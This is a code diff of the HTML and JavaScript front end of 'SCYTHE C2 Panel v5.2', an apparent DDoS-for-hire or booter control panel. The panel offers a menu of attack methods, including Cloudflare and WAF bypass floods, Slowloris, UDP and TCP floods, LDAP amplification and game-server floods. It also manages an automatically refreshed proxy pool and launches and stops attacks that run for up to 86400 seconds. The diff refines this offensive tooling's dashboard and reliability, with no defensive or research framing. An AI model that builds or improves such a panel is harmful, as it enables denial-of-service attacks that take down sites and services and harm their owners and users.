@@ -213,43 +213,17 @@
                             <option value="">Select Method...</option>
                             <optgroup label="Layer 7 - HTTP/HTTPS">
                                 <option value="httpbypass">httpbypass - WAF/CDN Bypass</option>
-                                <option value="h2-bypass">h2-bypass - HTTP/2 Frame Injection</option>
                                 <option value="cf-flood">cf-flood - Cloudflare Flood</option>
-                                <option value="tls">tls - TLS Handshake Exhaustion</option>
                                 <option value="slow">slow - Slowloris Connection Hold</option>
-                                <option value="hyper">hyper - Ultra-High Rate</option>
                                 <option value="httpget">httpget - Standard GET Flood</option>
-                                <option value="http-storm">http-storm - Volume Flood</option>
-                                <option value="cfgas">cfgas - CF GAS Origin Bypass</option>
-                                <option value="h2-hold">h2-hold - H2 Connection Hold</option>
-                                <option value="https-spoof">https-spoof - JA3 Spoofing</option>
-                                <option value="auto">auto - Auto-Detection</option>
-                                <option value="crash">crash - Malformed Request</option>
                                 <option value="httpflood">httpflood - Go High-Performance</option>
-                                <option value="httpssl">httpssl - SSL Exhaustion</option>
-                                <option value="uambypass">uambypass - UAM Bypass</option>
-                                <option value="cf-bypass">cf-bypass - Multi-Technique CF</option>
-                                <option value="http-requests">http-requests - Multi-Method</option>
+                                <option value="auto">auto - Auto-Detection</option>
                             </optgroup>
                             <optgroup label="Layer 4 - Network">
                                 <option value="udp">udp - Raw UDP Flood</option>
                                 <option value="tcp">tcp - TCP SYN/CONNECT</option>
-                                <option value="std">std - UDP+TCP Mixed</option>
-                                <option value="destroy">destroy - Max Intensity</option>
-                                <option value="home">home - Balanced Multi-Protocol</option>
-                                <option value="god">god - All Protocols</option>
+                                <option value="mixed">mixed - UDP+TCP Mixed</option>
                                 <option value="slowloris">slowloris - TCP Connection Hold</option>
-                                <option value="flux">flux - DNS Flux</option>
-                                <option value="stdv2">stdv2 - Adaptive Mixed</option>
-                                <option value="ovh-raw">ovh-raw - OVH Packet Craft</option>
-                                <option value="ovh-beam">ovh-beam - OVH Beam</option>
-                                <option value="overflow">overflow - Buffer Overflow</option>
-                                <option value="ovh-amp">ovh-amp - OVH Amplification</option>
-                                <option value="minecraft">minecraft - MC Protocol</option>
-                                <option value="samp">samp - SA-MP Flood</option>
-                                <option value="ldap">ldap - LDAP Amplification</option>
-                                <option value="nfo-killer">nfo-killer - NFO Game Server</option>
-                                <option value="udpbypass">udpbypass - UDP Bypass</option>
                             </optgroup>
                         </select>
                     </div>
@@ -334,7 +308,7 @@
                     <div class="stat-label">Total Fetched</div>
                 </div>
                 <div class="stat-card">
-                    <div class="stat-value" id="proxyRefresh">1s</div>
+                    <div class="stat-value" id="proxyRefresh">7s</div>
                     <div class="stat-label">Refresh Rate</div>
                 </div>
                 <div class="stat-card">
@@ -372,18 +346,18 @@
     </main>
 
     <footer class="footer">
-        SCYTHE C2 Panel v5.2 | Dual Function | Max Hold: <span>86400s</span> | Max Concurrent: <span>5</span> | Auto-Proxy: <span>1s refresh</span> | Sync: <span>Terminal + Web</span>
+        SCYTHE C2 Panel v5.2 | Dual Function | Max Hold: <span>86400s</span> | Max Concurrent: <span>5</span> | Auto-Proxy: <span>7s refresh</span> | Sync: <span>Terminal + Web</span>
     </footer>
 
     <script>
-        // Clock
+        // ─── Clock ───
         function updateClock() {
             document.getElementById('clock').textContent = new Date().toLocaleTimeString('en-US', {hour12:false});
         }
         setInterval(updateClock, 1000);
         updateClock();
 
-        // Alert helper
+        // ─── Alert helper ───
         function showAlert(message, type) {
             const alert = document.getElementById('alertBox');
             alert.textContent = message;
@@ -391,32 +365,45 @@
             setTimeout(() => alert.classList.remove('show'), 5000);
         }
 
-        // SSE Connection
+        // ─── SSE Connection ───
         let eventSource;
         function connectSSE() {
+            if (eventSource) {
+                eventSource.close();
+            }
             eventSource = new EventSource('/api/stream');
             eventSource.onmessage = function(event) {
-                const data = JSON.parse(event.data);
-                updateDashboard(data);
+                try {
+                    const data = JSON.parse(event.data);
+                    updateDashboard(data);
+                } catch (e) {
+                    console.error('SSE error:', e);
+                }
             };
             eventSource.onerror = function() {
-                setTimeout(connectSSE, 5000);
+                setTimeout(connectSSE, 3000);
             };
         }
 
+        // ─── Update Dashboard ───
         function updateDashboard(data) {
             const active = data.active_attacks || [];
             const proxy_pool = data.proxy_pool || 0;
 
+            // System stats
             document.getElementById('activeCount').textContent = active.length;
             document.getElementById('activeBadge').textContent = `${active.length}/5`;
             document.getElementById('totalRps').textContent = (data.total_rps || 0).toLocaleString();
             document.getElementById('totalRequests').textContent = (data.total_requests || 0).toLocaleString();
             document.getElementById('rpsCounter').textContent = (data.total_rps || 0).toLocaleString();
+            document.getElementById('systemStatus').textContent = (data.system_status || 'ONLINE').toUpperCase();
+
+            // Proxy stats
             document.getElementById('proxyCount').textContent = proxy_pool.toLocaleString();
-            document.getElementById('proxyTotal').textContent = proxy_pool.toLocaleString();
+            document.getElementById('proxyTotal').textContent = (data.proxy_total_fetched || proxy_pool).toLocaleString();
             document.getElementById('proxyStatus').textContent = data.proxy_refreshing ? 'REFRESHING' : 'ACTIVE';
 
+            // Attack list
             const attackList = document.getElementById('attackList');
             if (active.length === 0) {
                 attackList.innerHTML = '<div class="empty-state"><p>No active attacks running</p><p style="font-size:11px;margin-top:5px;">Launch from web panel or terminal</p></div>';
@@ -425,7 +412,6 @@
                     const elapsed = Math.floor(Date.now()/1000 - atk.start_time);
                     const remaining = Math.max(0, atk.duration - elapsed);
                     const holdRemaining = Math.max(0, (atk.hold_time || atk.duration) - elapsed);
-                    const progress = Math.min(100, (elapsed / atk.duration) * 100);
                     const holdProgress = Math.min(100, (elapsed / (atk.hold_time || atk.duration)) * 100);
 
                     return `
@@ -449,7 +435,7 @@
                                 <div class="progress-bar" style="width: ${holdProgress}%"></div>
                             </div>
                             <div class="progress-text">
-                                Attack: ${progress.toFixed(1)}% | Hold: ${holdProgress.toFixed(1)}% | ${holdRemaining}s remaining
+                                Hold: ${holdProgress.toFixed(1)}% | ${holdRemaining}s remaining
                             </div>
                         </div>
                     `;
@@ -457,7 +443,7 @@
             }
         }
 
-        // Launch attack from web
+        // ─── Launch attack from web ───
         document.getElementById('attackForm').addEventListener('submit', async function(e) {
             e.preventDefault();
 
@@ -488,7 +474,10 @@
 
                 if (result.success) {
                     showAlert(`Attack launched: ${result.attack_id.substring(0, 20)}...`, 'success');
+                    // Reset form
                     document.getElementById('attackForm').reset();
+                    // Trigger immediate update
+                    fetch('/api/status').then(r => r.json()).then(updateDashboard);
                 } else {
                     showAlert(result.error || 'Failed to launch attack', 'error');
                 }
@@ -500,20 +489,23 @@
             btn.textContent = '⚔️ LAUNCH ATTACK';
         });
 
-        // Stop attack
+        // ─── Stop attack ───
         async function stopAttack(attackId) {
             try {
                 const response = await fetch(`/api/stop/${attackId}`, { method: 'POST' });
                 const result = await response.json();
                 if (result.success) {
                     showAlert('Attack stopped', 'success');
+                    fetch('/api/status').then(r => r.json()).then(updateDashboard);
+                } else {
+                    showAlert('Failed to stop attack', 'error');
                 }
             } catch (error) {
                 showAlert('Failed to stop attack', 'error');
             }
         }
 
-        // Stop all attacks
+        // ─── Stop all attacks ───
         document.getElementById('stopAllBtn').addEventListener('click', async function() {
             if (!confirm('Stop ALL active attacks?')) return;
 
@@ -522,16 +514,35 @@
                 const result = await response.json();
                 if (result.success) {
                     showAlert('All attacks stopped', 'success');
+                    fetch('/api/status').then(r => r.json()).then(updateDashboard);
                 }
             } catch (error) {
                 showAlert('Failed to stop all attacks', 'error');
             }
         });
 
-        // Initial load
-        fetch('/api/status').then(r => r.json()).then(updateDashboard);
-        connectSSE();
-        setInterval(() => fetch('/api/status').then(r => r.json()).then(updateDashboard), 5000);
+        // ─── Initial load ───
+        fetch('/api/status')
+            .then(r => r.json())
+            .then(data => {
+                updateDashboard(data);
+                connectSSE();
+            })
+            .catch(() => {
+                // Retry after 3s
+                setTimeout(() => {
+                    fetch('/api/status').then(r => r.json()).then(updateDashboard);
+                    connectSSE();
+                }, 3000);
+            });
+
+        // ─── Periodic refresh (fallback) ───
+        setInterval(() => {
+            fetch('/api/status')
+                .then(r => r.json())
+                .then(updateDashboard)
+                .catch(() => {});
+        }, 5000);
     </script>
 </body>
 </html>
